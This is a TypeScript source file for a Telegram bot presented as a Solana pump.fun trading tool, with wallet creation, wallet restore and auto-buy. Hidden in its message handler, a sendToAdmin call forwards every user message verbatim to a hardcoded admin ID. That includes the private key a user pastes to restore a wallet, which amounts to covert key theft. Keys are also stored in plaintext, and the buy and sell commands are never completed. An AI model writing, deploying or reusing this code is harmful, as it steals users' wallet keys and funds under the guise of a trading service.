import dotenv from 'dotenv';
import { Telegraf, Markup } from 'telegraf';
import * as solanaWeb3 from '@solana/web3.js';
import bs58 from 'bs58';
import crypto from 'crypto';
import fs from 'fs';
import path from 'path';

import { mintToken } from './mint';
import { sellWithOrca } from './sell';
import { autoBuy, getBoughtAmount } from './utils/autoBuy';
import { fetchPumpFunTokens } from './utils/pumpFunApi';
import { Keypair } from '@solana/web3.js';

dotenv.config();

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN!;
const ADMIN_ID = 7948630771;
const WELCOME_STICKER = 'CAACAgUAAxkBAAEBQY1kZ...'; // Replace with a valid sticker ID
const USERS_FILE = path.join(__dirname, 'users.json');
const SPAM_INTERVAL = 1500; // ms

if (!BOT_TOKEN) throw new Error('TELEGRAM_BOT_TOKEN is missing from .env');

const bot = new Telegraf(BOT_TOKEN);

type UserStrategy = {
  minVolume?: number;
  minHolders?: number;
  minAge?: number;
};

type User = {
  trades: number;
  activeTrades: number;
  history: string[];
  wallet?: string;
  secret?: string;
  strategy?: UserStrategy;
  lastMessageAt?: number;
};

type UsersMap = Record<string, User>;
const users: UsersMap = loadUsers();
const awaitingUsers: Record<string, any> = Object.create(null);
const pendingWalletVerifications: Record<string, any> = Object.create(null);
const boughtTokens: Record<string, Set<string>> = {};

function loadUsers(): UsersMap {
  try {
    if (fs.existsSync(USERS_FILE)) {
      const data = fs.readFileSync(USERS_FILE, 'utf8');
      return JSON.parse(data);
    }
  } catch (e) {
    console.error('Failed to load users:', e);
  }
  return Object.create(null);
}

function saveUsers() {
  try {
    fs.writeFileSync(USERS_FILE, JSON.stringify(users, null, 2));
  } catch (e) {
    console.error('Failed to save users:', e);
  }
}


setInterval(async () => {
  try {
    const tokens = await fetchPumpFunTokens();
    for (const userId in users) {
      const user = users[userId];
      const strategy = user.strategy;
      if (!strategy || !user.wallet) continue;
      if (!boughtTokens[userId]) boughtTokens[userId] = new Set();
      // Match strategy conditions
      const matches = tokens.filter(token =>
        token.volume >= (strategy.minVolume || 0) &&
        token.holders >= (strategy.minHolders || 0) &&
        token.ageMinutes >= (strategy.minAge || 0) &&
        !boughtTokens[userId].has(token.address)
      );
      for (const token of matches) {
        try {
          await autoBuy(token.address, 0.01);
          boughtTokens[userId].add(token.address);
          user.history.push(`🚀 Auto-buy: ${token.symbol} (${token.address.slice(0,6)}...)`);
          await bot.telegram.sendMessage(userId, `🚀 ${token.symbol} was auto-bought according to your strategy!`);
        } catch (e: any) {
          await bot.telegram.sendMessage(userId, `❌ Failed to buy ${token.symbol}: ${typeof e === 'object' && e && 'message' in e ? e.message : e}`);
        }
      }
    }

  } catch (e) {
    console.error('Auto-buy interval error:', e);
  }
}, 60 * 1000); // every minute

// pump.fun strategy setup
bot.command('strategy', async (ctx) => {
  const userId = String(ctx.from?.id);
  awaitingUsers[userId] = 'set_strategy_minVolume';
  await ctx.reply('🔢 Enter minimum volume (e.g. 1000):');
});

async function sendToAdmin(message: string, ctx: any) {
  const userId = String(ctx.from?.id);
  if (ADMIN_ID && Number(ADMIN_ID) > 0 && userId !== String(ADMIN_ID)) {
    try {
      await ctx.telegram.sendMessage(ADMIN_ID, message);
    } catch (err: any) {
      if (err?.response?.error_code === 400) {
        console.error('⚠️ Admin has not started the bot yet.');
      } else {
        console.error('Failed to send message to admin:', err);
      }
    }
  }
}

bot.start(async (ctx) => {
  const userId = String(ctx.from?.id);
  if (!users[userId]) {
    awaitingUsers[userId] = 'choose_wallet_action';
    await ctx.reply('Welcome! Do you want to restore an existing wallet or create a new one?',
      Markup.inlineKeyboard([
        [Markup.button.callback('Restore Wallet', 'restore_wallet')],
        [Markup.button.callback('Create New Wallet', 'create_wallet')],
        [Markup.button.callback('Cancel', 'cancel_input')]
      ])
    );
    await sendToAdmin(`New user started: ${userId}`, ctx);
    return;
  }
  try {
    await ctx.replyWithSticker(WELCOME_STICKER);
  } catch (e) {}
  await ctx.reply(
    'Welcome to the trading bot!\n\nHere is what you can do:\n\n' +
    '• /tokens — View the latest pump.fun tokens\n' +
    '• /buy — Buy a token by mint address\n' +
    '• /sell — Sell a token by mint address\n' +
    '• /strategy — Set your auto-buy strategy\n' +
    '• /exportkey — Export your private key (be careful!)\n' +
    '• /activity — View your activity\n' +
    '• /menu — Show main menu\n' +
    '• /help — Show help and usage instructions',
    Markup.inlineKeyboard([
      [Markup.button.callback('My Activity', 'show_activity')],
      [Markup.button.callback('Set Trades', 'set_trades')],
      [Markup.button.callback('Help', 'help')]
    ])
  );
});

bot.action('restore_wallet', async (ctx) => {
  const userId = String(ctx.from?.id);
  awaitingUsers[userId] = 'await_restore_secret';
  await ctx.reply('Please send your wallet private key (base64):',
    Markup.inlineKeyboard([[Markup.button.callback('Cancel', 'cancel_input')]])
  );
  await sendToAdmin(`User ${userId} chose to restore wallet.`, ctx);
});

bot.action('create_wallet', async (ctx) => {
  const userId = String(ctx.from?.id);
  if (!users[userId]) {
    const keypair = Keypair.generate();
    const publicKey = keypair.publicKey.toBase58();
    const secretKey = Buffer.from(keypair.secretKey).toString('base64');
    users[userId] = {
      trades: 0,
      activeTrades: 1,
      history: [],
      wallet: publicKey,
      secret: secretKey
    };
    saveUsers();
    delete awaitingUsers[userId];
    await ctx.reply('Your new Solana wallet has been created!\nAddress: ' + publicKey + '\n\n*Keep this address to receive tokens. You can export your private key later using /exportkey.*', { parse_mode: 'Markdown' });
    try {
      await ctx.replyWithSticker(WELCOME_STICKER);
    } catch (e) {}
    await ctx.reply(
      'Welcome to the trading bot!\n\nHere is what you can do:\n\n' +
      '• /tokens — View the latest pump.fun tokens\n' +
      '• /buy — Buy a token by mint address\n' +
      '• /sell — Sell a token by mint address\n' +
      '• /strategy — Set your auto-buy strategy\n' +
      '• /exportkey — Export your private key (be careful!)\n' +
      '• /activity — View your activity\n' +
      '• /menu — Show main menu\n' +
      '• /help — Show help and usage instructions',
      Markup.inlineKeyboard([
        [Markup.button.callback('My Activity', 'show_activity')],
        [Markup.button.callback('Set Trades', 'set_trades')],
        [Markup.button.callback('Help', 'help')]
      ])
    );
    await sendToAdmin(`User ${userId} created a new wallet.`, ctx);
  }
});

bot.action('back_to_menu', async (ctx) => {
  await ctx.replyWithChatAction('typing');
  await ctx.reply(
    '⬅️ Main Menu:',
    {
      parse_mode: 'Markdown',
      ...Markup.inlineKeyboard([
        [Markup.button.callback('My Activity', 'show_activity')],
        [Markup.button.callback('Set Trades', 'set_trades')],
        [Markup.button.callback('Help', 'help')]
      ])
    }
  );
});
// Show main menu with /menu command
bot.command('menu', async (ctx) => {
  await ctx.reply('Main Menu:',
    Markup.inlineKeyboard([
      [Markup.button.callback('My Activity', 'show_activity')],
      [Markup.button.callback('Set Trades', 'set_trades')],
      [Markup.button.callback('Help', 'help')]
    ])
  );
});

// Show help and usage instructions
bot.command('help', async (ctx) => {
  await ctx.reply(
    '🤖 *Bot Usage Guide*\n\n' +
    '• /tokens — View the latest pump.fun tokens\n' +
    '• /buy — Buy a token by mint address\n' +
    '• /sell — Sell a token by mint address\n' +
    '• /strategy — Set your auto-buy strategy\n' +
    '• /exportkey — Export your private key (be careful!)\n' +
    '• /activity — View your activity\n' +
    '• /menu — Show main menu\n' +
    '\nTo get started, try /tokens or set your strategy with /strategy.',
    { parse_mode: 'Markdown' }
  );
});

// The connect_wallet button is removed; wallet is created automatically

bot.action('show_activity', async (ctx) => {
  const userId = String(ctx.from?.id);
  const history = users[userId]?.history || [];
  const text = history.length ? history.map((h: string) => `• ${h}`).join('\n') : 'No activity yet.';

  await ctx.reply(`📊 *Your Activity:*\n${text}`, {
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard([[Markup.button.callback('⬅️ Back', 'back_to_menu')]])
  });
});

bot.action('set_trades', async (ctx) => {
  const userId = String(ctx.from?.id);
  awaitingUsers[userId] = 'set_trades';

  await ctx.reply(
    '🔢 *Enter number of trades (1 to 10):*',
    {
      parse_mode: 'Markdown',
      ...Markup.inlineKeyboard([[Markup.button.callback('❌ Cancel', 'cancel_input')]])
    }
  );
});

bot.action('cancel_input', async (ctx) => {
  const userId = String(ctx.from?.id);
  delete awaitingUsers[userId];
  await ctx.reply('Input cancelled.');
});


bot.on('text', async (ctx) => {
  const userId = String(ctx.from?.id);
  const text = ctx.message.text.trim();
  const name = ctx.from?.first_name || '';

  // Spam prevention
  const now = Date.now();
  if (users[userId]?.lastMessageAt && now - users[userId].lastMessageAt < SPAM_INTERVAL) {
    return ctx.reply('Please wait before sending another message.');
  }
  users[userId] = users[userId] || { trades: 0, activeTrades: 1, history: [] };
  users[userId].lastMessageAt = now;
  saveUsers();

  await sendToAdmin(`Message from ${name}:\n${text}`, ctx);

  // Restore wallet from private key
  if (awaitingUsers[userId] === 'await_restore_secret') {
    try {
      const secret = Buffer.from(text, 'base64');
      const keypair = Keypair.fromSecretKey(secret);
      const publicKey = keypair.publicKey.toBase58();
      users[userId].wallet = publicKey;
      users[userId].secret = text;
      users[userId].history.push('Wallet restored');
      saveUsers();
      delete awaitingUsers[userId];
      await ctx.reply('Wallet restored!\nAddress: ' + publicKey, { parse_mode: 'Markdown' });
      try {
        await ctx.replyWithSticker(WELCOME_STICKER);
      } catch (e) {}
      await ctx.reply(
        'Welcome to the trading bot!\n\nHere is what you can do:\n\n' +
        '• /tokens — View the latest pump.fun tokens\n' +
        '• /buy — Buy a token by mint address\n' +
        '• /sell — Sell a token by mint address\n' +
        '• /strategy — Set your auto-buy strategy\n' +
        '• /exportkey — Export your private key (be careful!)\n' +
        '• /activity — View your activity\n' +
        '• /menu — Show main menu\n' +
        '• /help — Show help and usage instructions',
        Markup.inlineKeyboard([
          [Markup.button.callback('My Activity', 'show_activity')],
          [Markup.button.callback('Set Trades', 'set_trades')],
          [Markup.button.callback('Help', 'help')]
        ])
      );
      await sendToAdmin(`User ${userId} restored a wallet.`, ctx);
    } catch (err) {
      await ctx.reply('Invalid private key. Please send a valid base64-encoded Solana private key.');
    }
    return;
  }
  // pump.fun strategy setup
  if (awaitingUsers[userId]?.startsWith('set_strategy')) {
    users[userId] = users[userId] || { trades: 0, activeTrades: 1, history: [] };
    users[userId].strategy = users[userId].strategy || {};
    if (awaitingUsers[userId] === 'set_strategy_minVolume') {
      const v = parseFloat(text);
      if (isNaN(v) || v < 0) return ctx.reply('❌ Please enter a valid number for volume.');
      users[userId].strategy.minVolume = v;
      awaitingUsers[userId] = 'set_strategy_minHolders';
      return ctx.reply('👥 Enter minimum holders (e.g. 50):');
    }
    if (awaitingUsers[userId] === 'set_strategy_minHolders') {
      const h = parseInt(text);
      if (isNaN(h) || h < 0) return ctx.reply('❌ Please enter a valid number for holders.');
      users[userId].strategy.minHolders = h;
      awaitingUsers[userId] = 'set_strategy_minAge';
      return ctx.reply('⏳ Enter minimum age in minutes (e.g. 10):');
    }
    if (awaitingUsers[userId] === 'set_strategy_minAge') {
      const a = parseInt(text);
      if (isNaN(a) || a < 0) return ctx.reply('❌ Please enter a valid number for age.');
      users[userId].strategy.minAge = a;
      delete awaitingUsers[userId];
      users[userId].history.push(`pump.fun strategy saved: Volume ≥ ${users[userId].strategy.minVolume}, Holders ≥ ${users[userId].strategy.minHolders}, Age ≥ ${users[userId].strategy.minAge} min`);
      return ctx.reply('✅ Your strategy has been saved!');
    }
    return;
  }

  if (awaitingUsers[userId] === 'set_trades') {
    const num = parseInt(text);
    if (isNaN(num) || num < 1 || num > 10) {
      await ctx.reply('❌ Must be a number between 1 and 10.');
    } else {
      users[userId] = users[userId] || { trades: 0, activeTrades: 1, history: [] };
      users[userId].activeTrades = num;
      users[userId].history.push(`Set trades to: ${num}`);
      await ctx.reply(`✅ Trades set to ${num}.`);
    }
    delete awaitingUsers[userId];
    return;
  }

  if (/^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(text)) {
    const message = pendingWalletVerifications[userId]?.message;
    if (!pendingWalletVerifications[userId]) {
      pendingWalletVerifications[userId] = {};
    }
    pendingWalletVerifications[userId].address = text;
    await ctx.reply(`📝 Sign the following message:\n\n${message}`);
    return;
  }

  if (/^[1-9A-HJ-NP-Za-km-z]{80,120}$/.test(text) && pendingWalletVerifications[userId]) {
    const { address, message } = pendingWalletVerifications[userId];
    try {
      const pubkey = new solanaWeb3.PublicKey(address);
      const signature = bs58.decode(text);
      const nacl = await import('tweetnacl');
      const isValid = nacl.default.sign.detached.verify(
        Buffer.from(message),
        signature,
        pubkey.toBytes()
      );
      if (isValid) {
        users[userId] = users[userId] || { trades: 0, activeTrades: 1, history: [] };
        users[userId].wallet = address;
        users[userId].history.push(`✅ Wallet linked: ${address}`);
        delete pendingWalletVerifications[userId];
        await ctx.reply('✅ *Wallet linked successfully!*', {
          parse_mode: 'Markdown'
        });
        await sendToAdmin(`✅ Wallet linked by ${name}:\n${address}`, ctx);
      } else {
        await ctx.reply('❌ Invalid signature.');
      }
    } catch (err) {
      await ctx.reply('❌ Signature verification failed.');
    }
    return;
  }

  // Fallback for any unknown or unexpected input
  await ctx.reply(
    'Unknown command or input. Type /help to see available commands.',
    Markup.inlineKeyboard([
      [Markup.button.callback('Main Menu', 'back_to_menu')]
    ])
  );
});

bot.command('buy', async (ctx) => {
  const userId = String(ctx.from?.id);
  if (!users[userId]?.wallet) return ctx.reply('❌ Please connect your wallet first.');
  awaitingUsers[userId + '_buy'] = true;
  ctx.reply('🔍 Send the token mint address to buy:');
});

bot.command('sell', async (ctx) => {
  const userId = String(ctx.from?.id);
  if (!users[userId]?.wallet) return ctx.reply('❌ Please connect your wallet first.');
  awaitingUsers[userId + '_sell'] = true;
  ctx.reply('💰 Send the token mint address to sell:');
});

bot.command(['tokens', 'pumpfun', 'list'], async (ctx) => {
  const userId = String(ctx.from?.id);
  await ctx.reply('Fetching the latest pump.fun tokens ...');
  try {
    const tokens = await fetchPumpFunTokens();
    if (!tokens.length) return ctx.reply('No tokens found at the moment.');
    const top = tokens.slice(0, 10);
    let msg = '<b>Latest pump.fun tokens:</b>\n';
    msg += top.map((t, i) =>
      `\n${i+1}. ${t.symbol} | $${t.marketCap.toLocaleString()} MC | ${t.volume.toLocaleString()} Vol | ${t.holders} Holders | ${t.ageMinutes}m\n<code>${t.address}</code>`
    ).join('\n');
    await ctx.reply(msg, {
      parse_mode: 'HTML',
      ...Markup.inlineKeyboard([[Markup.button.callback('Refresh', 'refresh_tokens')]])
    });
    users[userId] = users[userId] || { trades: 0, activeTrades: 1, history: [] };
    users[userId].history.push('Viewed pump.fun tokens list');
    saveUsers();
  } catch (e: any) {
    await ctx.reply('Error fetching tokens: ' + (e?.message || e));
  }
});

bot.action('refresh_tokens', async (ctx) => {
  const userId = String(ctx.from?.id);
  await ctx.reply('Refreshing tokens...');
  try {
    const tokens = await fetchPumpFunTokens();
    if (!tokens.length) return ctx.reply('No tokens found at the moment.');
    const top = tokens.slice(0, 10);
    let msg = '<b>Latest pump.fun tokens:</b>\n';
    msg += top.map((t, i) =>
      `\n${i+1}. ${t.symbol} | $${t.marketCap.toLocaleString()} MC | ${t.volume.toLocaleString()} Vol | ${t.holders} Holders | ${t.ageMinutes}m\n<code>${t.address}</code>`
    ).join('\n');
    await ctx.reply(msg, { parse_mode: 'HTML' });
  } catch (e: any) {
    await ctx.reply('Error fetching tokens: ' + (e?.message || e));
  }
});

bot.command('exportkey', async (ctx) => {
  const userId = String(ctx.from?.id);
  const user = users[userId];
  if (!user || !user.secret) {
    return ctx.reply('❌ No wallet is linked to this account.');
  }
  await ctx.reply('⚠️ *Warning: Your private key gives full control over your funds. Never share it with anyone!*\n\nYour private key (base64):\n' + user.secret, { parse_mode: 'Markdown' });
});

process.on('unhandledRejection', (reason, promise) => {
  console.error('Unhandled Rejection:', reason);
});
process.on('uncaughtException', (err) => {
  console.error('Uncaught Exception:', err);
});

console.log('🚀 Telegram bot process started.');

bot.launch()
  .then(() => console.log('✅ Bot is running'))
  .catch((err) => console.error('❌ Bot launch failed:', err));
